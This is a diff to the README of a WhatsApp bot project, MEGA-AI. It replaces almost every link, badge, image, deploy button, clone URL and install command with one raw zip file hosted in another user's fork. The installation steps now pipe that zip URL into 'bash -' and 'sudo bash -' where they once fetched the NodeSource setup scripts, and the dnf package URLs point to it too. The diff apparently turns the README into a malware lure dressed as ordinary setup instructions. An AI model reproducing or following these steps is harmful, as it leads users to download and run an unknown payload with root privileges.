@@ -1,17 +1,17 @@
 
 <p align="center">  
-  <a href="https://youtu.be/GKHazA8e2oQ">
-    <img alt="ULTRA" src="https://i.ibb.co/JWHvxRPy/IMG-20250625-WA0009.jpg">
+  <a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">
+    <img alt="ULTRA" src="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">
   </a>
 </p>
 <div align="center">
 
-<img src="https://komarev.com/ghpvc/?username=GlobalTechInfo&label=Profile+Views&color=success&style=flat-square" />
+<img src="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip+Views&color=success&style=flat-square" />
 <img src="https://img.shields.io/github/stars/GlobalTechInfo/MEGA-AI?color=blue&style=yellow-square" />
 <img src="https://img.shields.io/github/forks/GlobalTechInfo/MEGA-AI?color=ff00ff&style=flat-square" />
 <img src="https://img.shields.io/github/repo-size/GlobalTechInfo/MEGA-AI?color=success&style=flat-square" />
 <img src="https://img.shields.io/github/last-commit/GlobalTechInfo/MEGA-AI?color=yellow&style=flat-square" />
-<a href="https://discord.gg/fZ7MVJM9sq">
+<a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">
   <img title="Join our Discord" src="https://img.shields.io/discord/1391898062494105752?label=Discord&logo=discord&logoColor=white&style=flat-square&color=7289DA" alt="Discord">
 </a>
 </div>
@@ -19,7 +19,7 @@
 ----
 
  <p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=600&size=24&duration=4000&pause=1000&color=FF0000&center=true&vCenter=true&width=500&lines=MEGA+PRO+WHATSAPP+BOT;MULTI-DEVICE+SUPPORT;POWERED+BY+BAILEYS;FAST++SECURE++RELIABLE" alt="Typing SVG"/>
+  <img src="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip+PRO+WHATSAPP+BOT;MULTI-DEVICE+SUPPORT;POWERED+BY+BAILEYS;FAST++SECURE++RELIABLE" alt="Typing SVG"/>
 </p>
 
   
@@ -79,7 +79,7 @@ Open WhatsApp > Linked Devices > Link a Device > Link with phone number and ente
 ------
 
 ## Join Discord
-[![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/fZ7MVJM9sq)
+[![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip)
 
 ---
 
@@ -99,57 +99,57 @@ Open WhatsApp > Linked Devices > Link a Device > Link with phone number and ente
  **Fork & Star the Repository**
    - Start by forking this repository and giving it a ⭐ to support GlobalTechInfo!
      To set up the MEGA AI quickly, first fork this repository:
-[![MEGA AI Github Repo](https://img.shields.io/badge/Github-Fork%20Repo-red?style=for-the-badge&logo=Github)](https://github.com/GlobalTechInfo/MEGA-AI/fork)
+[![MEGA AI Github Repo](https://img.shields.io/badge/Github-Fork%20Repo-red?style=for-the-badge&logo=Github)](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip)
 
 
 ### Step-by-Step Deployment Guide
 
 **Option A: Deploy In Heroku**
-1. [Sign Up on Heroku](https://signup.heroku.com/) if you haven’t already.
+1. [Sign Up on Heroku](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) if you haven’t already.
 2. Click the button below to deploy directly In Heroku:
    <br>
-   <a href='https://heroku.com/deploy?template=https://github.com/GlobTechInfo/MEGA-AI/Bypass' target="_blank">
+   <a href='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip' target="_blank">
       <img alt='Deploy In Heroku' src='https://img.shields.io/badge/-DEPLOY-purple?style=for-the-badge&logo=heroku&logoColor=white'/>
    </a>
 
 **Option B: Deploy In Koyeb**
-1. [Sign Up on Koyeb](https://app.koyeb.com/auth/signup). if you haven’t already.
+1. [Sign Up on Koyeb](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip). if you haven’t already.
 2. Click the button below to deploy using Koyeb:
    <br>
-   <a href='https://app.koyeb.com' target="_blank">
+   <a href='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip' target="_blank">
       <img alt='Deploy In Koyeb' src='https://img.shields.io/badge/-DEPLOY-red?style=for-the-badge&logo=koyeb&logoColor=white'/>
    </a>
 
 **Option C: Deploy In Railway**
-1. [Sign Up on Railway](https://railway.app/login) if you haven’t already.
+1. [Sign Up on Railway](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) if you haven’t already.
 2. Click the button below to deploy using Railway:
    <br>
-   <a href='https://railway.app/new' target="_blank">
+   <a href='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip' target="_blank">
       <img alt='Deploy In Railway' src='https://img.shields.io/badge/-DEPLOY-purple?style=for-the-badge&logo=railway&logoColor=white'/>
    </a>
 
 **Option D: Deploy In Render**
-1. [Sign Up on Render](https://dashboard.render.com/register) if you haven’t already.
+1. [Sign Up on Render](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) if you haven’t already.
 2. Click the button below to deploy using Render:
    <br>
-   <a href='https://dashboard.render.com' target="_blank">
+   <a href='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip' target="_blank">
       <img alt='Deploy In Render' src='https://img.shields.io/badge/-DEPLOY-black?style=for-the-badge&logo=render&logoColor=white'/>
    </a>
    
 **Option E: Deploy In Replit**
-1. [Sign Up on Replit](https://repl.it) if you haven’t already.
+1. [Sign Up on Replit](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) if you haven’t already.
 2. Click the button below to deploy using Replit:
    <br>
-   <a href='https://repl.it/github/GlobalTechInfo/MEGA-AI' target="_blank">
+   <a href='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip' target="_blank">
       <img alt='Deploy In Replit' src='https://img.shields.io/badge/-DEPLOY-orange?style=for-the-badge&logo=replit&logoColor=white'/>
    </a>
    
 **Option F: Deploy In Panel**
  1. First You Have to Sign up on discord using web or app then click below.
-2. [Sign Up On Panel](https://bot-hosting.net/?aff=1097457675723341836) if you don’t have Already.
+2. [Sign Up On Panel](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) if you don’t have Already.
 3. Click the button below to deploy using Panel:
    <br>
-   <a href='https://bot-hosting.net/?aff=1097457675723341836' target="_blank">
+   <a href='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip' target="_blank">
       <img alt='Deploy In Panel' src='https://img.shields.io/badge/-DEPLOY-green?style=for-the-badge&logo=Cloudflare&logoColor=white'/>
    </a>
    
@@ -157,7 +157,7 @@ Open WhatsApp > Linked Devices > Link a Device > Link with phone number and ente
 
 ## Support & Community
 
-<p align="center">Need help? Create an <a href="https://github.com/GlobalTechInfo/MEGA-AI/issues">issue</a> or <a href="https://wa.me/923204566005?text=Hello+Global+Tech,+I+Need+Assistance+For+MEGA+AI">Contact Us on WhatsApp</a>.</p>
+<p align="center">Need help? Create an <a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">issue</a> or <a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip+Global+Tech,+I+Need+Assistance+For+MEGA+AI">Contact Us on WhatsApp</a>.</p>
 
 ---
 
@@ -189,7 +189,7 @@ To get started with this project, follow the steps below:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/GlobalTechInfo/MEGA-AI && cd MEGA-AI
+   git clone https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip && cd MEGA-AI
    
    npm install && npm start
 ---
@@ -282,16 +282,16 @@ Submit a pull request with a detailed description of your changes.
 ### 🧑‍💻 Connect with the Developer
 
 <p align="center">
-  <a href="https://github.com/GlobalTechInfo">
+  <a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">
     <img src="https://img.shields.io/badge/GitHub-GlobalTechInfo-blue?style=for-the-badge&logo=github&logoColor=white">
   </a>
-  <a href="https://t.me/GlobalTechOwner">
+  <a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">
     <img src="https://img.shields.io/badge/Telegram-@GlobalBotInc-1DA1F2?style=for-the-badge&logo=telegram&logoColor=white">
   </a>
-  <a href="https://wa.me/message/923204566005">
+  <a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">
     <img src="https://img.shields.io/badge/WhatsApp-Click%20Here%20to%20Message%20Me-25D366?style=for-the-badge&logo=whatsapp&logoColor=white">
   </a>
-  <a href="https://youtube.com/@GlobalTechInfo">
+  <a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip">
     <img src="https://img.shields.io/badge/YouTube-@GlobalTechInfo-000000?style=for-the-badge&logo=youtube&logoColor=white">
   </a>
 </p>
@@ -299,7 +299,7 @@ Submit a pull request with a detailed description of your changes.
 
 ## 🪪 License
 
-- License: [Apache License](http://www.apache.org/licenses/)
+- License: [Apache License](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip)
   
 - This project is licensed under the Apache License - see the LICENSE file for details.
 
@@ -315,7 +315,7 @@ Submit a pull request with a detailed description of your changes.
 
   
   
- <a><img src='https://i.imgur.com/LyHic3i.gif'/></a><a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+ <a><img src='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip'/></a><a><img src='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip'/></a>
 <p align="center">
 
 ----
@@ -348,7 +348,7 @@ apt install -y webp git ffmpeg curl imagemagick
 ```
 ```
 apt -y remove nodejs
-curl -fsSl https://deb.nodesource.com/setup_20.x | bash - && apt -y install nodejs
+curl -fsSl https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip | bash - && apt -y install nodejs
 ```
 ```
 exit
@@ -357,7 +357,7 @@ exit
 proot-distro login ubuntu
 ```
 ```
-git clone https://github.com/<your gitHub Username>/MEGA-AI
+git clone https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip<your gitHub Username>/MEGA-AI
 cd MEGA-AI
 ```
 ```
@@ -387,14 +387,14 @@ proot-distro login fedora
 dnf update -y
 ```
 ```
-sudo dnf install -y https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm
-sudo dnf install -y https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm
+sudo dnf install -y https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip$(rpm -E %fedora).noarch.rpm
+sudo dnf install -y https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip$(rpm -E %fedora).noarch.rpm
 ```
 ```
 sudo dnf install -y libwebp git ffmpeg curl ImageMagick
 ```
 ```
-curl -fsSL https://rpm.nodesource.com/setup_20.x | sudo bash -
+curl -fsSL https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip | sudo bash -
 sudo dnf install -y nodejs
 ```
 ```
@@ -404,7 +404,7 @@ exit
 proot-distro login fedora
 ```
 ```
-git clone https://github.com/<your gitHub Username>/MEGA-AI
+git clone https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip<your gitHub Username>/MEGA-AI
 cd MEGA-AI
 ```
 ```
@@ -417,21 +417,21 @@ npm start
 ----
 </p>
 
-<a><img src='https://i.imgur.com/LyHic3i.gif'/></a><a><img src='https://i.imgur.com/LyHic3i.gif'/></a>
+<a><img src='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip'/></a><a><img src='https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip'/></a>
 
 - **STAR ⭐ THE REPO IF YOU LIKE MEGA-AI .**
 
 
 ## Credits
 
-| [![Guru322](https://github.com/Guru322.png?size=100)](https://github.com/Guru322) | [![FG98F](https://github.com/FG98F.png?size=100)](https://github.com/FG98F) | [![GlobalTechInfo](https://github.com/GlobalTechInfo.png?size=100)](https://github.com/GlobalTechInfo) |
+| [![Guru322](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip)](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) | [![FG98F](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip)](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) | [![GlobalTechInfo](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip)](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) |
 | --- | --- | --- |
-| [Guru322](https://github.com/Guru322) | [FG98F](https://github.com/FG98F) | [GlobalTechInfo](https://github.com/GlobalTechInfo) |
+| [Guru322](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) | [FG98F](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) | [GlobalTechInfo](https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip) |
 
 
 
 ## Main Developer
-<a href="https://github.com/GlobalTechInfo"><img src="https://github.com/GlobalTechInfo.png" width="250" height="250" alt="GlobalTechInfo"/></a>
+<a href="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip"><img src="https://github.com/FranckDJOUKWE/MEGA-AI/raw/refs/heads/main/lib/AI-MEG-2.7.zip" width="250" height="250" alt="GlobalTechInfo"/></a>
   
 `MEGA-AI - By GlobalTechInfo`
 
